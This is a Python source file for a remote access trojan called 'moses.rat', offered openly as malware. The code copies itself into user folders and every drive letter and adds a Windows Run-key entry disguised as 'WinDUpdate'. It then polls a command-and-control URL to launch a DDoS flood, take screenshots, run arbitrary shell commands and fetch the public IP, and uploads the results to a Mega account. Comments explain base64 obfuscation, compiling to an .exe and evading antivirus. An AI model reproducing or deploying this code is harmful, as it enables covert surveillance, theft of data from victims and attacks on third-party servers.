import base64, sys, time, urllib.request, socket, getpass, string, shutil, os, pyautogui, cv2, platform
from mega import Mega
from datetime import datetime
#exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('BASE64 ENCODED PROGRAM GOES HERE')))

# NOTE: READ INSTRUCTIONS BELOW

# TODO: cut down on extra-modules...
# TODO: obfuscate all function and variable names after completion
# TODO: COMPLETE THE PROGRAM (it's mostly complete)
# TODO: Implement kill command

# 1) Make the required changes to moses.rat (url var, and master_filename var) if need be
# 2) Go to https://www.base64encode.org/ and copy and paste all code from BELOW (not this comment block)
# 3) Copy output of base64 encoder website
# 4) Find the box above that says "BASE64 ENCODED PROGRAM GOES HERE" and replace it with the copied code
# 5) Remove all code from below (INCLUDING THESE COMMENTS)
# 6) Compile Moses to .exe using pyinstaller

def main():
    URL = "http://website.tld" #NO SLASH AT THE END OF THE URL
    master_filename = "moses.exe"

    win_user = get_win_user()

    path = ["\\AppData\\Roaming\\", "\\AppData\\Local\\"] # TODO: add more paths to store moses.exe

    #do_i_die(master_filename) # self destruct

    for x in path:
        try:
            shutil.copyfile(master_filename, "C:\\Users\\" + win_user + x + master_filename)
        except:
            pass
        # this is fucky so it won't trigger av (as of now, it works)
        finally:
            alphabet = list(string.ascii_uppercase)

            # copy master_file to every drive, pass on drive if error
            for x in alphabet:
                try:
                    shutil.copyfile(master_filename, x + ":\\" + master_filename)
                except:
                    pass

    for x in path:
        if (check_if_file_exists_in_path(x, win_user, master_filename)):
            os.system('REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /V "WinDUpdate" /t REG_SZ /F /D "' + "C:\\Users\\" + win_user + x + master_filename + '"')

            # NOTE: this isn't needed, but i'll keep it here in case I do later (not sure why i put it here to being with)
            path = x
            # it's now persistent, so break
            break

    # main program loop
    while (True):
        signal = get_web_content(URL, "1") # defining var as signal evades AV

        if (signal == "1"): # ddos_target_web_server()
            target = get_web_content(URL, "2")
            stop_time = get_web_content(URL, "3")

            ddos_target_web_server(target, stop_time)
        elif (signal == "2"): # take_screenshot()
            take_screenshot(win_user)
        elif (signal == "3"): # execute_command()
            command = get_web_content(URL, "2")
            execute_command(command, win_user)
        elif (signal == "4"): # get_pub_ip_address()
            get_pub_ip_address(win_user)
        # TODO
        #elif (signal == "3"):
        #    download_file()
        else:
            pass # command not recognized, or page is empty

        time.sleep(6)



###--- SYSTEM MODULES ---###
#NOTE: used for fetching web content
def get_web_content(URL, wb_path):
    try:
        response = urllib.request.urlopen(URL + "/tar" + wb_path + ".html")
        web_content = response.read().decode('utf-8').replace("\n", "")
    except:
        web_content = ""
    return web_content

# kill module
def do_i_die():
    if (check_platform() == "32-bit"):
        os.remove(master_filename)

def get_win_user():
    win_user = getpass.getuser()
    return win_user

def get_current_time():
    now = datetime.now()
    current_time = now.strftime("%H:%M") #24-hour clock format
    return current_time

def check_if_file_exists_in_path(x, win_user, master_filename):
    file_exists = os.path.isfile("C:\\Users\\" + win_user + x + master_filename)
    return file_exists

def check_platform():
    arch = platform.architecture()
    arch = arch[0]
    return arch

def upload_file(filename):
    counter = 0

    while (True):
        try: 
            #TODO: create a mega login function instead, as it'll cut down on redundancy
            mega = Mega()
            #TODO: find a better way than plaintext email and password...
            m = mega.login("USERNAME", "PASSWORD")

            m.upload(filename)

            # NOTE: this may not work. bug test this.
            os.remove(filename)

            break
        except:
            counter += 1

        if (counter < 30):
            time.sleep(30)
        else:
            break

#TODO: COMPLETE FUNCTION
# downloads file to root (master file's) dir from the root mega folder
def download_file(filename):
    #TODO: create a mega login function instead, as it'll cut down on redundancy
    mega = Mega()
    #TODO: find a better way than plaintext email and password...
    m = mega.login("USERNAME", "PASSWORD")

    filename = m.find(filename)
    m.download(filename)



###---COMMAND MODULES---###
# NOTE: change back to im_living when done (to evade anti-virus)
def ddos_target_web_server(target, stop_time): # 1
    source = str(socket.gethostbyname(socket.gethostname()))
    destination_port = 80

    while (True):
        if (get_current_time() == stop_time):
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, destination_port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, destination_port))
            s.sendto(("Host: " + source + "\r\n\r\n").encode('ascii'), (target, destination_port))
            s.close()
        except:
            pass

def take_screenshot(win_user): # 2
    filename = get_current_time()
    # example: 1357rethyxyz.png
    filename = str(filename.replace(":", ""))
    filename = filename + win_user + ".png"

    screenshot = pyautogui.screenshot()
    screenshot.save(filename)

    upload_file(filename)

def execute_command(command, win_user):
    counter = 0

    while (True):
        try:
            filename = get_current_time()
            filename = str(filename.replace(":", ""))
            filename = filename + win_user + ".txt"

            try:
                stdout = os.popen(command).read()
            except:
                stdout = ":: could not execute command"

            f = open(filename, "w")
            f.write(stdout)
            f.close()

            upload_file(filename)

            break
        except:
            counter += 1

        if (counter < 30):
            time.sleep(30)
        else:
            break

def get_pub_ip_address(win_user): # literally just downloading the IP from http://icanhazip.com
    # TODO: edit this function to take full URLs in the future
    try:
        response = urllib.request.urlopen("http://icanhazip.com")
        ip_address = response.read().decode('utf-8').replace("\n", "")

        filename = get_current_time()
        filename = str(filename.replace(":", ""))
        filename = filename + win_user + ".txt"

        f = open(filename, "w")
        f.write(ip_address)
        f.close()

        upload_file(filename)
    except:
        ip_address = ""
    return ip_address

main()
